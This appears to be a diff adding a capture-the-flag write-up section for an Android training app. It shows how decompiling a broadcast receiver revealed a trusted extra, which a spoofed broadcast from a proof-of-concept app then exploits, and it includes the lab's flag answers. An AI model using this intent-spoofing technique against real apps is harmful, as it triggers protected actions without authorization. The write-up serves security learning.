@@ -889,3 +889,42 @@ flag = HXT{returned-result-ds82s}
 Finally, I displayed the returned flag using a Toast:
 ```text
 Flag: HXT{returned-result-ds82s}```
+
+# Flag 20 — Spoofing the Notification Intent
+
+After opening Flag 20, I checked the notification and then inspected `Flag20Activity` and `Flag20Receiver` in **JADX**.
+
+The notification uses the action:
+
+```java
+new Intent(GET_FLAG)
+```
+
+where:
+
+```java
+GET_FLAG = "io.hextree.broadcast.GET_FLAG";
+```
+
+In `Flag20Receiver`, I found that it checks for a `give-flag` extra:
+
+```java
+if (intent.getBooleanExtra("give-flag", false)) {
+    success(context);
+}
+```
+
+So I created my own broadcast with the same action and added `give-flag=true`:
+
+```java
+Intent intent = new Intent("io.hextree.broadcast.GET_FLAG");
+intent.putExtra("give-flag", true);
+sendBroadcast(intent);
+```
+
+After opening Flag 20 and running this from my PoC app, the receiver accepted the broadcast and triggered the success flow. I then opened the Flag activity and got:
+
+```text
+HXT{spoof-notificaiton-result-er12d}
+```
+
